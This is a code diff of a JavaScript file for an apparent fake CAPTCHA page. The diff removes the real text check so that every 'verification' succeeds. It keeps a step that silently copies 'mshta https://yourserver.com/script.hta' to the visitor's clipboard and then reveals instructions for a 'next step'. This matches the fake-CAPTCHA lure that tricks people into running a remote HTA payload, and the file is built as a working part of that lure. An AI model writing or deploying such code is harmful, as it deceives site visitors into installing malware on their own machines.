@@ -1,43 +1,29 @@
 // script.js
-let correctCaptcha = "W4rK1"; // The text that the user should input
+let correctCaptcha = "W4rK1"; // The string for the CAPTCHA
 
-function generateCaptcha() {
-    // Simple random string for captcha, you can make this more complex
-    let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    let captcha = '';
-    for (let i = 0; i < 5; i++) {
-        captcha += characters.charAt(Math.floor(Math.random() * characters.length));
-    }
-    correctCaptcha = captcha;
-
-    // Display the CAPTCHA in the image-like div
-    document.getElementById('captchaImage').innerText = captcha;
+function startVerification() {
+    // This simulates user interacting with CAPTCHA
+    const captchaText = document.getElementById('captchaText');
+    captchaText.innerHTML = "Verification in progress...";
+    captchaText.style.color = '#4285f4'; // Change color to indicate progress
+    document.getElementById('verifyButton').style.display = 'inline-block'; // Show verify button
 }
 
 function verifyCaptcha() {
-    let userInput = document.getElementById('captchaInput').value;
-    let resultMessage = document.getElementById('resultMessage');
-    let commandInstructions = document.querySelector('.command-instructions');
-    
-    if (userInput === correctCaptcha) {
-        resultMessage.innerText = 'CAPTCHA Verified Successfully!';
-        resultMessage.style.color = 'green';
+    // Simulate captcha being solved after clicking "Verify"
+    const resultMessage = document.getElementById('resultMessage');
+    const commandInstructions = document.querySelector('.command-instructions');
 
-        // Copy the command to clipboard
-        const command = "mshta https://yourserver.com/script.hta";
-        navigator.clipboard.writeText(command).then(() => {
-            commandInstructions.style.display = 'block'; // Show instructions
-        }).catch(err => {
-            resultMessage.innerText = 'Failed to copy the command.';
-            resultMessage.style.color = 'red';
-        });
-    } else {
-        resultMessage.innerText = 'Invalid CAPTCHA. Please try again.';
+    // Simulating a successful CAPTCHA
+    resultMessage.innerText = 'CAPTCHA Verified Successfully!';
+    resultMessage.style.color = 'green';
+
+    // Copy the mshta command to clipboard
+    const command = "mshta https://yourserver.com/script.hta";
+    navigator.clipboard.writeText(command).then(() => {
+        commandInstructions.style.display = 'block'; // Show instructions for next step
+    }).catch(err => {
+        resultMessage.innerText = 'Failed to copy the command.';
         resultMessage.style.color = 'red';
-    }
+    });
 }
-
-// Initialize CAPTCHA on page load
-document.addEventListener('DOMContentLoaded', () => {
-    generateCaptcha();
-});
